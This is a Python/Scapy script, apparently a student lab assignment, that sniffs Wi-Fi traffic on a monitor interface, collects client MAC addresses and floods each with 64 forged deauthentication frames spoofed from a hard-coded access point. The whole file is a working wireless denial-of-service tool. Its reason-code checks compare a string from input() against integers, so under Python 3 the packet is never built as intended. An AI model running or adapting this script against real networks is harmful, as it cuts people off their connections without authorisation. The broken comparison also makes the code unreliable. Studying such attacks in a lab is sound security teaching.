#!/usr/bin/env python
#-*- coding: utf-8 -*-
#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
#  Authors : yimnaing Kamdem && Siu Aurelien
#  Objectif: Développer un script en Python/Scapy capable de générer et envoyer des trames de
#            déauthentification. Le script donne le choix entre des Reason codes différents déduit
#			 si le message doit être envoyé à la STA ou à l'AP

#-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
import sys

interface = "wlan0mon"
accessPointBSSID = "dc:a5:f4:60:c3:52" 
clientsBSSID = []
pkt = ""

def sniffing(packetToSniff):
    
    #if packetToSniff.type == 0:
        
    #print(packetToSniff.addr1)
    # on enregistre  l'adresse mac source si elle n'est pas encore present dans la liste        
    if packetToSniff.addr1 not in clientsBSSID :
        print(packetToSniff.addr1)
        clientsBSSID.append(packetToSniff.addr1)

reasonNumber = input('Choose number of reason code : \n \
1 - Unspecified\n \
4 - Disassociated due to inactivity\n \
5 - Disassociated because AP is unable to handle all currently associated stations\n \
8 - Deauthenticated because sending STA is leaving BSS\n\n \
Reason: ')

sniff(count=400, iface=interface, prn=sniffing)
         
for x in clientsBSSID :
    if(reasonNumber == 1 or reasonNumber == 4 or reasonNumber == 5):
        pkt = RadioTap() / Dot11(addr1=x, addr2=accessPointBSSID, addr3=accessPointBSSID) / Dot11Deauth(reason=reasonNumber)
    elif (reasonNumber == 8):
        pkt = RadioTap() / Dot11(addr1=accessPointBSSID, addr2=x, addr3=x) / Dot11Deauth(reason=reasonNumber)
    for y in range(64):    
        sendp(pkt, iface=interface)
    
